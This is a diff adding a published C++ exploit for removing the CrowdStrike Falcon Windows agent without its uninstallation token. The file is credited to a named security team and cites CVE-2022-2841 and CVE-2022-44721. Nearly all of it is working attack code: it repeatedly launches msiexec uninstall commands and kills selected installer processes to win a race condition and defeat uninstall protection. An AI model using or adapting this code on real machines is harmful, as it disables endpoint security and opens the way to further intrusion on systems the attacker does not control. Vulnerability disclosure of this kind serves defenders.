@@ -1,0 +1,136 @@
+# Exploit Title: Uninstall CrowdStrike Falcon AGENT without Installation Token 
+# Date: 30/11/2022 
+# Exploit Author: Fortunato Lodari, Raffaele Nacca, Davide Bianchin, Walter Oberacher, Luca Bernardi (Deda Cloud Cybersecurity Team) 
+# Vendor Homepage: https://www.crowdstrike.com/ 
+# Author Homepage: https://www.deda.cloud/ 
+# Tested On: All Windows versions 
+# Version: 6.44.15806 
+# CVE: Based on CVE-2022-2841; Modified by Deda Cloud Purple Team members, to exploit hotfixed release. Pubblication of of CVE-2022-44721 in progress. 
+
+
+#pragma once
+#define _CRT_SECURE_NO_WARNINGS
+
+#include <windows.h>
+#include <stdio.h>
+#include <tchar.h>
+#include <psapi.h>
+#include <list>
+#include <iostream>
+
+std::list<int> g_msiexec_instances = {};
+int g_msiexec_instance_count = 0;
+
+void CheckProcess(DWORD process_id, std::string cmd)
+{
+    TCHAR process_name[MAX_PATH] = { 0 };
+    HANDLE h_proc = OpenProcess(PROCESS_ALL_ACCESS, FALSE, process_id);
+
+    if (nullptr != h_proc) {
+
+        HMODULE h_mod = 0;
+        DWORD c_need = 0;
+
+        if (EnumProcessModules(h_proc, &h_mod, sizeof(h_mod), &c_need)) {
+
+            GetModuleBaseName(h_proc, h_mod, process_name,
+                sizeof(process_name) / sizeof(char));
+        }
+
+    }
+    else {
+        return;
+    }
+    if (wcsstr(_wcslwr(process_name), __T("msiexec"))) {
+
+        bool already_found = (
+            std::find(
+                g_msiexec_instances.begin(),
+                g_msiexec_instances.end(),
+                process_id) != g_msiexec_instances.end()
+            );
+
+        if (!already_found) {
+            std::cout << "[!] PID " << process_id << ": " << std::endl;
+            g_msiexec_instance_count++;
+            std::cout << "[+] Installer spawned process: " << process_id << std::endl;
+
+            g_msiexec_instances.push_front(process_id);
+
+            // If it's the third process, we try to kill it to produce open MSIHandles.
+            // This will break the uninstaller token check.
+			
+			// *****************************************
+			// SECOND UPDATE on MODZERO's exploit
+			// *****************************************
+			
+            if (g_msiexec_instance_count == 3 || g_msiexec_instance_count == 5) {
+                system(cmd.c_str());
+                std::cout << "[+] Killing process: " << process_id << std::endl;
+
+                if (!TerminateProcess(h_proc, 123)) {
+                    std::cout << "[!] Failed to kill process with PID " << process_id << ": " << GetLastError() << std::endl;
+                }
+
+                if (g_msiexec_instance_count == 4) {
+                    std::cout << "[+] Uninstall Protection should be bypassed." << std::endl;
+                    exit(0);
+                }
+            }
+        }
+    }
+
+    CloseHandle(h_proc);
+}
+
+int main(int argc, char* argv[])
+{
+    DWORD proc_ids[1024] = { 0 };
+    DWORD c_need = 0;
+    DWORD c_procs = 0;
+    DWORD i = 0;
+
+    if (argc != 2) {
+        std::cout << "Usage:" << std::endl << argv[0] << " PATH_TO_CsAgent.LionLanner.msi" << std::endl;
+        return 1;
+    }
+
+    // increase priority to realtime and start uninstall
+    SetPriorityClass(GetCurrentProcess(), REALTIME_PRIORITY_CLASS);
+
+    std::string path = std::string(argv[1]);
+    unsigned first = path.find("{");
+    unsigned last = path.find_last_of("}");
+    std::string guid = path.substr(first, last - first + 1);
+	
+	// *****************************************
+	// FIRST UPDATE ON MODZERO's exploit
+	// Let's run multiple instances of CMD (with START) running MSIEXEC to win the race condition
+	// *****************************************
+	
+    std::string cmd = "cmd /c start msiexec /x " + guid;
+
+    system(cmd.c_str());
+
+    // now listen for processes popping up
+    while (1) {
+
+        if (!EnumProcesses(proc_ids, sizeof(proc_ids), &c_need)) {
+            std::cout << "[-] Failed to read processes." << std::endl;
+            return 1;
+        }
+
+        c_procs = c_need / sizeof(DWORD);
+
+        // Check every process ID
+        for (i = 0; i < c_procs; i++) {
+
+            if (proc_ids[i] != 0) {
+                
+                CheckProcess(proc_ids[i],cmd);
+            }
+        }
+    }
+
+    return 0;
+}
